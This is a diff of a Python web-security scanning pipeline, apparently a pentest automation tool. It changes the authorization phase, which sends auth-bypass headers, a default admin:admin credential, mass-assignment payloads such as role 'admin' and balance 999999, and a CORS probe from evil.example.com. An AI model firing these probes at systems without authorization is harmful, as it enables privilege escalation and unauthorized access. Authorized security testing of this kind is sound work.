         for hdr in _AUTH_BYPASS_HEADERS:
+            await _throttle()
             try:
                 req = urllib.request.Request(ep, method="GET")
                 if ":" in hdr:
@@ -2942,7 +2850,7 @@ async def phase_16_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
                     req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
                 else:
                     req.add_header(hdr, "127.0.0.1")
-                with urllib.request.urlopen(req, timeout=8) as resp:
+                with _l_urlopen(req, timeout=8) as resp:
                     probe_body = resp.read()
                     probe_len = len(probe_body)
                     # Different status code → potential bypass
@@ -2971,16 +2879,27 @@ async def phase_16_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
     post_findings: List[str] = []
     post_targets = [ep for ep in targets if "?" not in ep.split("#")[0]][:_PIPELINE_CFG.sample_endpoints_post]
 
+    _MASS_ASSIGN_VALUES: Dict[str, object] = {
+        "admin": True, "is_admin": True, "role": "admin", "roles": ["admin"],
+        "permissions": ["admin"], "is_teacher": True, "is_student": True,
+        "group": "admin", "user_type": "admin", "plan": "enterprise", "tier": "premium",
+        "subscription": "premium", "balance": 999999, "points": 999999,
+        "score": 999999, "grade": "A+", "completed": True, "approved": True,
+        "verified": True, "active": True, "enabled": True,
+    }
+
     async def _check_mass_assignment(ep: str) -> List[str]:
         results: List[str] = []
         for field in _MASS_ASSIGN_FIELDS[:_PIPELINE_CFG.sample_endpoints_post]:
-            body = json.dumps({field: True}).encode()
+            await _throttle()
+            val = _MASS_ASSIGN_VALUES.get(field, True)
+            body = json.dumps({field: val}).encode()
             try:
                 req = urllib.request.Request(ep, data=body, method="POST",
                     headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
-                with urllib.request.urlopen(req, timeout=8) as resp:
+                with _l_urlopen(req, timeout=8) as resp:
                     if resp.status in (200, 201, 302):
-                        results.append(f"  POST {ep} {{{field}: true}} → {resp.status}")
+                        results.append(f"  POST {ep} {{{field}: {json.dumps(val)}}} → {resp.status}")
             except Exception:
                 continue
         return results
@@ -2997,10 +2916,11 @@ async def phase_16_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
     # 4. Basic CORS misconfiguration check (origin reflection)
     cors_findings: List[str] = []
     for ep in targets[:_PIPELINE_CFG.sample_endpoints_cors]:
+        _throttle_sync()
         try:
             req = urllib.request.Request(ep, method="GET")
             req.add_header("Origin", "https://evil.example.com")
-            with urllib.request.urlopen(req, timeout=8) as resp:
+            with _l_urlopen(req, timeout=8) as resp:
                 acao = resp.headers.get("Access-Control-Allow-Origin", "")
                 acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                 if "*" in acao or "evil.example.com" in acao:
@@ -3014,11 +2934,12 @@ async def phase_16_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
         findings.extend(cors_findings)
     findings.append("mass_assignment_fields_to_test:")
     for field in _MASS_ASSIGN_FIELDS:
-        findings.append(f'  try POST/PUT with body: {{"{field}": true}}')
+        val = _MASS_ASSIGN_VALUES.get(field, True)
+        findings.append(f'  try POST/PUT with body: {{"{field}": {json.dumps(val)}}}')
     out = ensure(outdir / "auth_bypass.txt")
     out.write_text("\n".join(findings) + ("\n" if findings else ""))
     log("ok", f"16-AUTHZ: {len(findings)} auth bypass findings → {out}")
-    return {"16-AUTHZ": str(out), "count": len(bypass_found)}
+    return {"16-AUTHZ": str(out), "count": len(findings)}
 
 
 # ───────────────────────────── report writers ──────────────────────────────
@@ -3250,25 +3171,20 @@ PIPELINE = [
 # Stage 1 — Analysis: JS, params, fuzzing, vuln scans, origin, secrets, authz
 # Stage 2 — Injection: XSS/SQLi/SSTI (needs params from stage 1)
 # Stage 3 — OOB: collect OOB callbacks after injections
+# Dependency-ordered execution stages. Phases in the same stage are independent
+# of one another (they only read artifacts produced by *earlier* stages, never
+# each other's output), so they run concurrently.
+# Stage 0 — Discovery: subdomains, DNS, ports, URLs (linear spine, streaming)
+# Stage 1 — Analysis: JS, params, fuzzing, vuln scans, origin, secrets, TLS
+# Stage 2 — Post-fuzz: injection (needs params), authz (reads ffuf output from
+#           Stage 1 so it must come after 08-FUZZ, not concurrent with it)
+# Stage 3 — OOB: collect OOB callbacks after injections
 STAGES: List[List[str]] = [
     ["01-RECON", "02-RESOLVE", "03-PERMUTE", "04-SCAN", "05-HARVEST"],
-    ["06-JSINTEL", "07-PARAMS", "08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "14-ORIGIN", "15-SECRETS", "16-AUTHZ"],
-    ["11-INJECT", "12-SSTI"],
+    ["06-JSINTEL", "07-PARAMS", "08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "14-ORIGIN", "15-SECRETS"],
+    ["11-INJECT", "12-SSTI", "16-AUTHZ"],
     ["13-OOB"],
 ]
-
-
-def _extract_domain(s: str) -> str:
-    """Extract a bare domain from a URL or hostname."""
-    s = s.strip()
-    if s.startswith("http://"):
-        s = s[7:]
-    elif s.startswith("https://"):
-        s = s[8:]
-    s = s.split("/")[0].split(":")[0].split("?")[0]
-    if _is_valid_hostname(s):
-        return s
-    return ""
 
 
 def _atomic_write_json(path: Path, payload: dict) -> None:
@@ -3411,7 +3327,6 @@ async def run_pipeline(args: argparse.Namespace) -> int:
         rate_limit=getattr(args, 'rate_limit', 0),
         sample_urls_fuzz=getattr(args, 'sample_urls_fuzz', 5),
         sample_urls_params=getattr(args, 'sample_urls_params', 50),
-        sample_urls_pspider=getattr(args, 'sample_urls_pspider', 20),
         sample_hosts_ssl=getattr(args, 'sample_hosts_ssl', 10),
         sample_hosts_origin=getattr(args, 'sample_hosts_origin', 10),
         sample_endpoints_l=getattr(args, 'sample_endpoints_l', 20),
@@ -3689,12 +3604,6 @@ def interactive_setup() -> argparse.Namespace:
         validator=_validate_count,
         error_msg="Enter a positive number or 'all'",
     )
-    sample_pspider = _prompt(
-        "Number of URLs for ParamSpider (enter 'all' for every URL)",
-        default="3",
-        validator=_validate_count,
-        error_msg="Enter a positive number or 'all'",
-    )
     # 6. Authentication / headers
     print(f"\n{C['b']}Authentication:{C['r']}")
     cookie = _prompt(
@@ -3759,9 +3668,10 @@ def interactive_setup() -> argparse.Namespace:
     ns.fast = False
     ns.resume = resume
     ns.force = force
+    ns.sample = False
     ns.quiet = False
     ns.no_color = False
-    ns.interactive = False
+    ns.interactive = True
     ns.sqlmap_level = int(sqlmap_level)
     ns.sqlmap_risk = int(sqlmap_risk)
     ns.delay = float(delay)
@@ -3771,7 +3681,6 @@ def interactive_setup() -> argparse.Namespace:
 
     ns.sample_urls_fuzz = _resolve_count(sample_fuzz)
     ns.sample_urls_params = _resolve_count(sample_params)
-    ns.sample_urls_pspider = _resolve_count(sample_pspider)
     ns.cookie = cookie
     ns.extra_headers = extra_headers_list if extra_headers_list else []
     return ns
@@ -3896,12 +3805,6 @@ def build_parser() -> argparse.ArgumentParser:
         type=int,
         default=50,
         help="number of URLs to sample for parameter discovery (default: 50)",
-    )
-    p.add_argument(
-        "--sample-urls-pspider",
-        type=int,
-        default=3,
-        help="number of URLs to sample for ParamSpider (default: 3)",
     )
     p.add_argument(
         "--sample-hosts-ssl",
